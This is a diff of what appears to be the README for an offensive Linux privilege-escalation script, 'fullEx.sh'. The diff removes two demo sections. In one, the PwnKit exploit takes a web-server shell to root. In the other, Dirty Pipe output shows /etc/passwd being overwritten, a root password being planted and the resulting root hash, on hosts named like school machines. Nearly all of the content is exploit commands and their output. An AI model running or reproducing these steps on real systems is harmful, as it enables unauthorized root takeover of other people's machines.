@@ -189,36 +189,6 @@ Process 2998 (-bash)
 Process 3288 (bash)
 Nbs dumped items: 0
 ```
-
-## 💀 PwnKit
-
-```
-www-data@Milburg-High:/tmp/fullEx$ ./fullEx.sh -PwnKit64
-./fullEx.sh -PwnKit64
-root@Milburg-High:/tmp/fullEx#
-```
-
-## 💀 DirtyPipe
-
-```
-www-data@university:/tmp/fullEx$ ./fullEx.sh -DirtyPipe
-./fullEx.sh -DirtyPipe
-[Dirty Pipe] Attempting to backup '/etc/passwd' to '/tmp/passwd.bak'
-[Dirty Pipe] Successfully backed up '/etc/passwd' to '/tmp/passwd.bak'
-[Dirty Pipe] Initiating write to '/etc/passwd'...
-[Dirty Pipe] Data size to write: 131 bytes
-[Dirty Pipe] File '/etc/passwd' opened successfully for reading.
-[Dirty Pipe] Pipe size determined: 65536 bytes
-[Dirty Pipe] Filling the pipe...
-[Dirty Pipe] Pipe filled successfully.
-[Dirty Pipe] Draining the pipe...
-[Dirty Pipe] Pipe drained successfully.
-[Dirty Pipe] Data successfully written to '/etc/passwd'.
-[Dirty Pipe] You can connect as root with password 'el3ph@nt!'
-[Dirty Pipe] Program execution completed successfully.
-root:$6$9WETWbCBTQ8pxg4I$odZAx8iIlayCnFdUwDM5dHVfsXXZo1RHRp2a4uQzcPDkRiTJYLA4loZESihn4ASGhWKN9.RWPT.CZJdyfTej4/:0:0:root:/root:/bin/sh
-```
-
 ## 💀 Sudo-Host
 
 ```
